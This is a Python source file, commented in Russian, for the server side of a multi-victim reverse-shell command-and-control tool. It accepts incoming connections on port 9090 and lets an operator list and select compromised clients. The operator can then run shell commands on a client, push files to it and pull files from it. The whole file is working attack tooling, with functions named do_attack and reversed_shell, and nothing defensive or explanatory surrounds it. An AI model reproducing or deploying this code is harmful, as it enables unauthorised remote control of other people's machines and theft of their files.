import socket
import datetime
import time
import os
import threading

all_conntections = list()
all_adresses = list()

def refresh():
    """
    Чистим старые соединения и адресса при каждом новом запуске скрипта на сервере.
    """
    for i in all_conntections:
        i.close
    del all_conntections[:]
    del all_adresses[:]

def accept_connections():
    """
    Является первым тредом который работает в фоне, принимает коннекты и распихивает их по спискам.
    """
    print("SockServerV2 is started")

    refresh()

    sock = socket.socket()
    sock.bind(('', 9090))
    sock.listen(5)

    while True:
        conn, addr = sock.accept()
        print("\nНовое соединение: ", addr[0], ", порт: ", addr[1])

        conn.setblocking(1) #я не знаю что оно делает, вроде убирает таймаут, поэксперементировать

        all_conntections.append(conn)
        all_adresses.append(addr)
        print("Соединение было добавлено")


def list_connections():
    """
    Является одной из команд нашего самописаного shell, который резуализуется в do_attack()
    Возвращает список проверенных коннектов (отсеивает отключенные, недоступные)
    """
    result = list()
    #на этом этапе мы можем просто вернуть all_conntections, но хорошо бы сделать проверку
    #enumerate возвращает кортеж из порядкового номера и самого объекта, используется для чистоты кода, не плодить счестчики
    for i, conn in enumerate(all_conntections):
        try:
            #для проверки пробуем что то послать по коннекту и получить обратно
            conn.send(b" ")
            conn.recv(1024)
        except Exception as e:
            print("Conn больше недоступен: ", all_adresses[i], " .Ошибка: ", str(e))
            #если была ошибка то удаляем коннтект с текущим индексом
            del all_conntections[i]
            del all_adresses[i]
            continue #перескакивам на начало цикла и не проваливаемся ниже по коду
        result.append(i)
        print("Доступный адрес: ", all_adresses[i][0], " номер ", i, " порт ", all_adresses[i][1])
    return result


def get_target(cmd):
    """
    Является второй командой нашего самописного shell, который реализуется в do_attack().
    Чистит команду от "select " и возвращает либо объект коннекта из списка рабочих коннектов, либо None.
    """
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        print("Коннект выбран успешно: ", all_adresses[target][0])
        return all_conntections[target]
    except Exception as e:
        print("При выборе коннекта произошла ошибка: ", str(e))
        return None


def reversed_shell(conn):
    """
    Когда коннект выбран мы проваливаеся в луп c Reversed shell, где бесконечно выполняем и получаем результат команд со
    стороны клиента, выход происходит по слову quit.
    """

    while True:
        cmd = input("Команда для Reversed shell: ")
        if cmd == "quit":
            #наверное не стоит закрывать коннект поэтому след 2 строки закомменчены
            break
        elif "send" in cmd:
            #если была команда сенд, значит шлем файл с сервера клиенту
            #парсим название файла
            try:
                command, file_name = cmd.split(" ")

                #готовим клиент к принятию файла
                op = open(file_name, 'rb')
                conn.send(cmd.encode())

                while True:
                    data = op.read(1024)
                    if not data:
                        #важно давать передышку клиенту что бы он успел услышать флаг финиша
                        time.sleep(1)
                        break
                    conn.send(data)
                conn.send(b"finish")
            except Exception as e:
                print(f"Ошибка: {e}, во время {cmd}")

            op.close()
            print(f"Файл {file_name} был передан")

        elif "get" in cmd:
            #распарсим команду на название файла
            command, file_name = cmd.split(" ")
            #делаем запрос клиенту что бы он послал файл
            conn.send(cmd.encode())

            #будем сохранять все файлы в папку downloads
            route = "downloads/"+file_name

            #создаем такой же файл на своей стороне
            op = open(route, 'wb')
            #флаг ошибок
            errors = False

            while True:
                #бесконечно слушаем и записываем результат, выход по флагу финиша
                data = conn.recv(1024)
                if data[:5] == b"ERROR":
                    #если клиент шлет ошибку, меняем флаг, выходим с прослушки канала
                    errors = True
                    break
                if data == b"finish":
                    #если клиент сказал что закончил слать, выходим с прослушки канала
                    break
                op.write(data)
            if errors:
                #если были ошибки то принтим ошибку от клиента и удаляем созданный файл
                print(f"Произошла ошибка при получении файла: {data.decode()}")
                os.remove(file_name)
            else:
                #если все ок закрываем файл в конце, иначе ничего не сохранится
                print(f"Файл {file_name} получен")
                op.close()
        else:
            try:
                timeout = 10
                #проваливаемся сюда когда шлемкоманды именно для CMD на стороне клиента
                conn.send(cmd.encode())
                #очень важно было расширить получаемый канал, так как когда принимаемые данные оказывались больше 1кб, тогда все падало
                #при следующих глюках и запаздывании консоли расширть канал по надобности
                #также ответ от консоли не всегда возможен/предусмотрен, надо ввести таймаут который кидает ошибку если в установленное время
                #не было получена ответа, поэтому ловим ошибку и не даем скрипту зависнуть
                conn.settimeout(timeout)
                data = conn.recv(2048)
                print(data.decode("cp866"))
            except Exception as e:
                print(f"Возникла ошибка при исполнении комманды {cmd} или таймаут [{timeout}] исчерпан: {e}")


def do_attack():
    """
    Является вторым тредом который работает в фоне и реализует функционал с доступными коннектами через самописный prompt.
    """
    while True:
        cmd = input("Команда для Prompt:")
        if cmd == "list":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                reversed_shell(conn)
        else:
            print("Команда не распознана")

if __name__ == '__main__':
    """
    Старт программы. Треды были реализованы классическим образом, хотя у автора была реализация через очереди (queue)
    """
    threadOne = threading.Thread(target=accept_connections, name="start handling connections")
    threadTwo = threading.Thread(target=do_attack, name="choose connection and start reversed shell")
    threadOne.start()
    threadTwo.start()
    threadOne.join()
    threadTwo.join()
